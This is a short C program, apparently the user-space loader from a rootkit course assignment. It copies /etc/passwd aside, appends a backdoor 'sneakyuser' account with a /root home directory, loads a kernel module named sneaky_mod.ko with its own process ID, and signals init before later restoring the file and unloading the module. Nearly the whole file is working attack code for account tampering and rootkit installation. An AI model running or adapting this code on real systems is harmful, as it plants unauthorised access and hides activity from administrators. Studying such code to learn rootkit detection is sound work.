#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <assert.h>


int copy_file(const char *origin_file, const char *dest_file){
  //printf(" test3 \n");
    FILE *origin = fopen(origin_file,"r");
    FILE *dest = fopen(dest_file,"w");
    if(!origin){
        printf("Fail to open the origin file\n");
        return -1;
    }
    if(!dest){
        printf("Fail to open file at destination location\n");
        return -1;
    }
    char c = fgetc(origin);
    while( c !=EOF){
        fputc(c, dest);
        c = fgetc(origin);
    }
    //printf(" test4 \n");
    fclose(origin);
    fclose(dest);
    //printf(" test5 \n");
}

int main(void){
  printf("sneaky_process pid = %d\n", getpid());

  system("cp /etc/passwd /tmp/passwd");
  //printf(" test0 \n");
  assert(system("echo 'sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n' >> /etc/passwd") != -1);
  //printf(" test1 \n");
  //system("cp /etc/passwd /tmp/passwd2");

  char message[128];
  sprintf(message, "insmod sneaky_mod.ko sneaky_pid=%d", getpid());
  system(message);

  system("kill -64 1");

  int inputChar;
  while ((inputChar = getchar()) != 'q');


  system("kill -64 1");
  system("rmmod sneaky_mod");

  assert(system("cp /tmp/passwd /etc/passwd") != -1);
  //printf(" test1 \n");
  // if(copy_file("/tmp/passwd", "/etc/passwd")==-1){
  //       return EXIT_FAILURE;
  //   }
  //printf(" test2 \n");
  system("rm -rf /tmp/passwd");
  //system("rm -rf /tmp/passwd2");

  return EXIT_SUCCESS;
}